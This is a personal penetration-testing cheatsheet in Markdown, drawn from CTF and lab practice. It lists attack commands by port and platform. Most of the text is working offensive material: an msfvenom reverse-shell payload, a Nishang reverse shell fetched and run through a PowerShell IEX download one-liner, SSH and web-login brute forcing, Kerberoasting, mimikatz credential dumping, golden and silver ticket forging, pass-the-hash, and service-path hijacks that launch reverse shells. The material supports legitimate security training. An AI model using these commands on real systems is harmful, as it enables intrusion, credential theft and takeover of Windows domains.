# Boot2Root cheatsheet

> personal cheathsheet populated via my [HTB](https://www.hackthebox.eu/), [Vulnhub](https://www.vulnhub.com/) and CTF experience.

## Summary

1. [Common tasks](#common-tasks)
2. [Common services/ports](#common-servicesports)
3. [Windows](#windows)
4. [Linux](#linux)

___

## Common tasks

- Spawning TTY Shell: `python -c 'import pty; pty.spawn("/bin/bash")'`
	+ Upgrade shell:
		* `export TERM=xterm` then `Ctrl + Z`
		* Finally, `stty raw -echo; fg` 

- Running an HTTP Server: `python3 -m http.server <PORT>`

- [File transfer techniques](https://github.com/amirr0r/notes/blob/master/Infosec/Pentest/file-transfer.md)
	+ **Example**: running an SMB server: `python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .`
		* (Windows) Copy file from SMB server: 

			```cmd
			copy \\<IP>\kali\<filename> C:\Temp\<filename>
			```

- Generating a reverse shell executable (Windows): 

	```bash
	msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=1234 -f exe -o reverse-shell.exe
	```

- Password cracking: `hashcat -m $ATTACK_MODE $FILE /usr/share/wordlists/rockyou.txt`
	+ `-r /usr/share/hashcat/rules/best64.rule` (Rule-based Attack)

- PowerShell tricks:
  + Turn RCE to complete shell using [Nishang](https://github.com/samratashok/nishang#nishang) ⬇️ 	
	```bash
	cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 shell.ps1
	echo "" >> shell.ps1
	echo "Invoke-PowerShellTcp -Reverse -IPAddress $(vpnip) -Port 443" >> shell.ps1
	# run an HTTP server + start a netcat listener
	```
	* PowerShell command: 
	  ```powershell 
	  powershell -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1');"
	  ```

___

## Common services/ports

### Port 21 (FTP)

`ftp $TARGET`

- Check if you can log in as `annonymous`

### Port 22 (SSH)

- Connect to remote server with private key: `ssh -i $KEY_FILE $USER@$TARGET`
- Fix common key exchange issue: `ssh -oKexAlgorithms=+diffie-hellman-group1-sha1`
- Port forwarding: `ssh -L $LPORT:$TARGET:$RPORT $USER@$TARGET`

- **SCP**:
	+ Copy a local file to a remote host: `scp $LFILE $USER@$TARGET:$RFILE`
	+ Copy a file from a remote host to a local directory: `scp $USER@$TARGET:$RFILE $LDIR`
	
#### Bruteforce

- Bruteforce private key:

```bash
$ /usr/share/john/ssh2john.py id_rsa.bak > $USER.john
$ john $USER.john --wordlist=/usr/share/wordlists/rockyou.txt
```

- Bruteforce connection:
	+ **medusa**: `medusa -h $TARGET -U $USER_WORDLIST -P $PASSWORD_WORDLIST -M ssh`
	+ **hydra**: `hydra -L $USER_WORDLIST -P $PASSWORD_WORDLIST $TARGET ssh`

### Port 53 (DNS)

> **TODO**: Explain zone trasnfer

- DNS Zone transfer: `$ dig axfr @$TARGET [domain]`

### Port 79 (Finger)

- [Pentestmonkey script]() :`./finger-user-enum.pl -U $USERNAME_WORDLIST -t $TARGET`
- Metasploit module: `use auxiliary/scanner/finger/finger_users`

> [Hacktricks - pentesting finger](https://book.hacktricks.xyz/pentesting/pentesting-finger)

### Port 80/443 (HTTP/HTTPS)

1. Looking for "hidden" directories/files:

```bash
# dirb
$ dirb http://$IP -o dirb.txt

# gobuster
$ gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt -o gobuster.txt
```

- specific extension: 

```bash
# dirb
$ dirb http://$IP -X .<extension> -o dirb.txt

# gobuster
$ gobuster dir -u http://$IP -w /usr/share/dirb/wordlists/common.txt -x .<ext(s)> -o gobuster.txt
```

- ignore SSL error (gobuster): `gobuster dir -u https://$IP -w /usr/share/dirb/wordlists/common.txt -o gobuster.txt -k`
	
2. Looking for subdmains:

`gobuster dns -d $DOMAIN -w $WORDLIST`

3. Bruteforce GET/POST:
	- `hydra [-L $USER_LIST|-l $USERNAME] [-P $PASSWORD_LIST|-p $PASSWORD] $TARGET [http-get-form|http-post-form] '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'` (**WordPress** example)
		+ `/wp-login.php` has to be replace by `action` value in form
		+ `log` & `pwd` can be `username` & `password` (it depends on the name attributes values in form)
		+ `wp-submit=Log+In` &rarr; text value of the submit button
		+ `F=Invalid username` &rarr; failure message

4. Vulnerability scan:
	- generic: `nikto -h $TARGET`
	- WordPress: `wpscan --url http://$TARGET`

5. Custom wordlist generator: `cewl http://$TARGET`

#### Wordpress (`wpscan`)

- Get an API TOKEN from [wpscan.com](https://wpscan.com/wordpress-security-scanner)
	+ `export WPSCAN_API_TOKEN=<API_TOKEN>` into `~/.bashrc`
	+ in `~/.wpscan/scan.yml`:

		```yaml
		cli_options:
  			api_token: <API_TOKEN>	
		```

```bash
# Enumerating users
wpscan --url http://<IP>/ --enumerate u
# Bruteforcing passwords
wpscan --url http://<IP>/ --password-attack wp-login -U admin -P /usr/share/wordlists/seclists/Passwords/darkweb2017-top10000.txt -t 50
```

### Port 445 (SMB - Samba)

- Listing directories: `smbclient -L //<IP>/<Sharename> -U "username%password"`
	+ In case of a smb shell, we can download all files by doing:
	
		```console
		smb: \> recurse ON
		smb: \> prompt OFF
		smb: \> mget *
		```
	
- (Recursive search) Listing directories and permissions: `smbmap -H $TARGET -R | tee smbmap.txt`
- "Manual" bruteforce: `for u in $(cat usernames.txt); do echo "User: $u"; smbclient -L //<IP>/ -U "$u%$u"; done`
- Enumerating shares: `crackmapexec smb $TARGET --shares`

### Port 389 (LDAP)

- `ldapsearch -h <IP> -x -s base namingcontexts` 
- `ldapsearch -h <IP> -x -b "<distinguishedName>" | grep "^dn"`

### Port 3306 (MySQL)

- Remote connection: `mysql -u $USER --password -h $TARGET [$DATABASE]`
- Dumping DB: `mysqldump -h $TARGET -u $USER -p $DATABASE > $DATABASE.sql`

#### Useful links

- [MySQL Commands](http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm)
- [SQl.sh](https://sql.sh/)

### Port 5432 (PostgreSQL)

- Connect to database; user will be prompted for password: 
`psql -h {{host}} -p {{port}} -U {{username}} -W {{database}}`

___

## Windows

### Shell

- (`gem install evil-winrm`) `evil-winrm -i <ip> -u <username> -p <password>`
- `winexe -U '<username>%<password>' //<IP> cmd.exe`
- PassTheHash: 
	+ `evil-winrm -i <ip> -u <username> -H <NTLM_HASH>`
	+ `pth-winexe -U '<username>%<NTLM_HASH' //<IP> cmd.exe`

```powershell
*Evil-WinRM* PS C:\> NET USER # list users
```

### Downloading files (alternative to `wget`)

> `c:\Windows\System32\spool\drivers\color\` is a world-writeable directory.

> [File transfer techniques](https://github.com/amirr0r/notes/blob/master/Infosec/Pentest/file-transfer.md)

```powershell
powershell -command "(new-object System.Net.WebClient).DownloadFile('http://$IP:$PORT/$FILE', 'c:\Windows\System32\spool\drivers\color\$FILE')"
```

### Active directory enumeration

- Enumerate all local accounts: `net user`
- Enumerate all users in the entire domain: `net user /domain`
- Enumerate all groups in the entire domain: `net group /domain`

#### `PowerView.ps1`

- Enumerating operating system:

	```powershell
	Get-NetComputer -FullData | select operatingsystem*
	```

- Enumerating domain users:

	```powershell
	Get-NetUser | select cn
	```

- Enumerating logged-in users:

	```powershell
	Get-NetLoggedon -ComputerName <COMPUTER_NAME>
	```

- Enumerating domain groups:

	```powershell
	Get-NetGroup -GroupName *admin*
	```

- Enumerating shared folders:

	```powershell
	Get-WmiObject -class Win32_Share
	```

- [PowerView.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
- [PowerView-3.0-tricks.ps1](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

#### `SharpHound` + `Bloodhound`

1. Collecting data with `SharpHound`:

	```powershell
	C:\> powershell -ep bypass
	PS C:\> . .\Downloads\SharpHound.ps1 
	PS C:\> Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip
	```
2. Transferring the **loot.zip** folder to our Attacker Machine (`scp`, **smb** &rarr; `copy`, etc.)
3. Mapping the network with `BloodHound`:

	```bash
	apt install -y bloodhound
	# Open a terminal and type the following:
	neo4j console # default credentials -> neo4j:neo4j
	# In another terminal, open bloodhound:
	bloodhound 
	```

	+ Drag and drop the **loot.zip** folder into Bloodhound in order to import the **.json** files

- [SharpHound.ps1](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1)

#### Password spraying

```cmd
.\Rubeus.exe brute /password:<PASSWORD> /noticket
```

[Spray-Passwords.ps1](https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1) can also be used to perform a brute force attack.

### Port 135 (RPC)

```bash
rpcclient -U "" $IP
<empty password>
rpcclient $> srvinfo       # identify the specific OS version
rpcclient $> enumdomusers  # display a list of users names defined on the server
rpcclient $> getdompwinfo  # get SMB password policy
rpcclient $> querydispinfo # get users info
```

### Port 139 (NetBIOS)

```bash
nmap -sU --open -p 161 <IP>
nbtscan -r <IP>
```

### UDP Port 161 (SNMP)

- Enumerating the Entire MIB Tree:
    
    ```bash
    snmpwalk -c public -v1 -t 10 <IP>
    ```
    
- Enumerating Windows Users:
    
    ```bash
    snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25
    ```
    
- Enumerating Running Windows Processes:
    
    ```bash
    snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2
    ```
    
- Enumerating open TCP ports:
    
    ```bash
    snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3
    ```
    
- Enumerating Installed Software:
    
    ```bash
    snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2
    ```
    
> `snmpcheck` 

### Port 1521 (Oracle TNS Listener)

```bash
git clone https://github.com/quentinhardy/odat.git
cd oda
pip3 install python-libnmap
pip3 install cx_oracle
python3 odat.py all -s <IP> -p <PORT>
```

### Port 3389 (RDP)

```bash
xfreerdp /u:<USER> /p:<PASS> /v:<IP> /cert:ignore

rdesktop -u <USER> -p <PASS> <IP>:3389
```

### Port 88 (Kerberos)

#### Enumerating users

```bash
./kerbrute userenum --dc <DC> -d <DOMAIN> <USERNAME_WORDLIST_FILENAME>
```

#### Harvesting tickets

- **Rubeus** (every 30 seconds):

	```cmd
	.\Rubeus.exe harvest /interval:30
	```

#### Kerberoasting

> **Kerberoasting** allows a user to request a service ticket for any service with a registered SPN then use that ticket to crack the service password.

- **Rubeus** (local):

	```cmd
	.\Rubeus.exe kerberoast
	```

- **Impacket** (remote):
	
	```bash
	GetUserSPNs.py <Domain>/<username>:<password> -dc-ip <IP> -request	
	```

- Cracking Kerberos 5 etype 23 TGS-REP: 

	```bash
	hashcat -m 13100 -a 0 hash.txt Pass.txt
	```

#### AS-REP Roasting

> **AS-REP Roasting** dumps the `krbasrep5` hashes of user accounts that have Kerberos pre-authentication disabled.

- **Rubeus** (local => automatically find as-rep roastable users):

	```cmd
	.\Rubeus.exe asreproast
	```

- **Impacket** (remote => requires to enumerate as-rep roastable users with `BloodHound` for instance): 

	```bash
	$ GetNPUsers.py <Domain>/[username] -dc-ip <IP> -request  [-no-pass -usersfile users.txt]
	```

- Cracking Kerberos 5 AS-REP etype 23 _(Sometimes Need to add `$23` after `$krb5asrep`)_: 

	```bash
	hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
	```

#### Pass The ticket

- Export all the tickets into **.kirbi** files in the current directory:

```cmd
mimikatz # sekurlsa::tickets /export
```

- Impersonate a given ticket:

```
mimikatz # kerberos::ptt <ticket>
```

- Verify with `klist` (or with `kerberos::list` within mimikatz)  that we successfully impersonated the ticket by listing our cached tickets.

#### Silver ticket (`mimikatz`)

1. Dump the hash and security identifier (SID) of the targeted service account:
	
	```cmd
	mimikatz # lsadump::lsa /inject /name:<SERVICE_NAME>
	```

2. Create a silver ticket:

	```cmd
	mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<SERVICE_SID> /krbtgt:<SERVICE_NTLM_HASH> [/id:1103] [/ptt]
	```

3. Open a new command prompt with elevated privileges with the given ticket:

	```cmd
	mimikatz # misc::cmd 
	```

#### Golden ticket (`mimikatz`)

1. Dump the hash and security identifier (SID) of the Kerberos Ticket Granting Ticket (krbtgt) service account:
	
	```cmd
	mimikatz # lsadump::lsa /inject /name:krbtgt
	```

2. Create a golden ticket:

	```cmd
	mimikatz # kerberos::golden /user:<USERNAME> /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> [/id:500] [/ptt]
	```

3. Open a new command prompt with elevated privileges and access to all machines with:

	```cmd
	mimikatz # misc::cmd 
	```
	
[Golden Ticket - Mimikatz alternative (impacket)](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a#golden-ticket)

___

### Privesc

> [Windows Privesc notes](https://github.com/amirr0r/notes/blob/master/Windows/Privesc.md)

<!-- > _`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`_ -->

- Look at your privileges: `whoami /priv` (<https://github.com/hatRiot/token-priv>)
	+ **SeImpersonatePrivilege**: impersonate any access tokens which it can obtain (Exploit: [Juicy Potato](https://github.com/ohpe/juicy-potato))
	+ **SeAssignPrimaryPrivilege**: assign an access token to a new process. (Exploit: [Juicy Potato](https://github.com/ohpe/juicy-potato))
	+ **SeBackupPrivilege**: grants **read** access to all objects on the system, regardless of their ACL.
	+ **SeRestorePrivilege**: grants writeaccess to all objects on the system, regardless of their ACL.
	+ **SeTakeOwnershipPrivilege**: lets the user take ownership over an object (the `WRITE_OWNER` permission).
	+ More advanced:
		* SeTcbPrivilege
		* SeCreateTokenPrivilege
		* SeLoadDriverPrivilege
		* SeDebugPrivilege (used by `getsystem` => metasploit)

- Kernel exploits: `systeminfo` + Windows exploit suggester
- Exploit service:
	+ querying the current status of a service:

		```cmd
		sc.exe query <name>
		```
	
	+ starting/stopping a service:

		```cmd
		net start/stop <name>
		```

	+ querying the configuration of a service:

		```cmd
		sc.exe qc <name>
		```

	+ Check our permissions ([accesschk.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk) is part of **Windows Sysinternals**):

		* On a specific service => (look for `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS`):

			```cmd
			.\accesschk.exe /accepteula -uwcqv user <service name>
			.\accesschk.exe /accepteula -ucqv user <service name>
			```
	
		* On a specific service executable:

			```cmd
			.\accesschk.exe /accepteula -quvw user <service exe>
			```
	
		* On a specific directory (look for **Unquoted Service Path**):

			```cmd
			.\accesschk.exe /accepteula -uwdq "C:"
			```
		
		* On a specific registry:

			```cmd
			.\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service_name>
			```

			+ overwrite the **ImagePath** registry value:

				```cmd
				reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\malicious.exe /f	
				```

	+ modifying a configuration option of a service:

		```cmd
		sc.exe config <name> <option>= <value>
		```

		* Example: changing `BINARY_PATH_NAME`:

			```
			sc config daclsvc binpath= "\"C:\PrivEsc\reverse-shell.exe\""
			```

- Look for passwords:
	+ `dir/s *pass* == *.config`
	+ `findstr /si password *.xml *.ini *.txt`
	+ SAM and SYSTEM files in:
		* `C:\Windows\Repair`
		* `C:\Windows\System32\config\RegBack`
		
		> Copy them to Kali and crack them using `hashcat` or just pass the hash 

- Look for saved credentials: `cmdkey /list`
	+ `runas /savecred /user:admin C:\PrivEsc\reverse.exe`

- Check scheduled tasks:
	+ `schtasks /query /fo LIST /v`
	+ PowerShell equivalent: 
		
		```powershell
		PS> Get-ScheduledTask| where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
		```

- `Mimikatz`:
	- ask for **SeDebugPrivilege** in order to interact with the LSASS process and processes owned by other accounts (to be executed as administrator):

		```cmd
		mimikatz # privilege::debug 
		Privilege '20' OK 
		```

	- dumping NTLM password hashes:

		```cmd
		mimikatz # lsadump::lsa /patch
		```

		* Cracking them with `hashcat` (or [Pass-The-Hash](#shell) directly): `hashcat -m 1000 ntlm-hashes.txt <WORDLIST>` 

	- dumping the credentials of all logged-on users:

		```cmd
		mimikatz # sekurlsa::logonpasswords
		```

	- dumping all service tickets of all logged-on users:
	
		```cmd
		mimikatz # sekurlsa::tickets
		```
	
	- download the service ticket with Mimikatz:

		```cmd
		mimikatz # kerberos::list /export
		```

	- **overpass the hash** _(turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication)_:

		```cmd
		mimikatz # sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:PowerShell.exe
		```
		
- Privesc within the domain:
	+ **PsExec**: `python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes <NTLM_Hash> <USER>@<IP> cmd.exe`
	+ Retrieve all of the password hashes that a user account (that is synced with the domain controller) has to offer:

	```bash
	python3 /usr/share/doc/python3-impacket/examples/secretsdump.py [-just-dc-ntlm] <domainName>/<username>[:<password>]@<IP>
	```

### Tools

- [nishang](https://github.com/samratashok/nishang): collection of scripts and payloads which enables usage of PowerShell for offensive security
- [dnSpy](https://github.com/0xd4d/dnSpy#dnspy---latest-release---%EF%B8%8F-donate): debugger and .NET assembly editor.
- [BloodHound](https://github.com/BloodHoundAD/Bloodhound/wiki): reveal the hidden and often unintended relationships within an Active Directory environment. 
- [Gist - Windows Privilege Escalation](https://gist.github.com/sckalath/8dacd032b65404ef7411)
- [LOLBAS](https://lolbas-project.github.io/#)
	+ [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup): offline command line lookup utility
- [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite#peass---privilege-escalation-awesome-scripts-suite)
	+ [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- [wesng](https://github.com/bitsadmin/wesng): Windows Exploit Suggester - Next Generation (WES-NG)
- [Watson](https://github.com/rasta-mouse/Watson#watson): enumerate missing KBs and suggest exploits for Privilege Escalation vulnerabilities
- [mimikatz](https://github.com/gentilkiwi/mimikatz#mimikatz)
<!--
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit): PowerShell Post-Exploitation Framework
- [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
-->

### Useful links

- [VbScrub - Tutorials](https://www.youtube.com/playlist?list=PL3B8L-z5QU-Yw80HOGXXUASBfv_K1WwO5)
- [Hackndo - Windows articles](https://beta.hackndo.com/archives/#windows)
- [Fuzzysecurity - Windows Privilege Escalation Fundamentals](https://www.fuzzysecurity.com/tutorials/16.html)
- [zer1t0 - Attacking Active Directory: 0 to 0.9](https://zer1t0.gitlab.io/posts/attacking_ad/)
- [RedTeam_CheatSheet.ps1](https://gist.github.com/jivoi/c354eaaf3019352ce32522f916c03d70)

___

## Linux

### Port 2049 (NFS)

```bash
nmap --script=nfs-showmount $TARGET 
showmount -e  $TARGET
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
# -o nolock (to disable file locking) is often needed for older NFS servers
```

> **TODO**...

### Privesc

> [Linux Privesc notes](https://github.com/amirr0r/notes/blob/master/Linux/Privesc.md#privesc)

- `sudo -l`
- [GTFOBins](https://gtfobins.github.io/)
- [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite#peass---privilege-escalation-awesome-scripts-suite)
	+ [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

___

## Useful links

- [HackTricks](https://book.hacktricks.xyz/)
- [swisskyrepo - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
- [THM - What The Shell? (WU)](https://github.com/amirr0r/thm/tree/master/what-the-shell)
- [Hashcat - Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
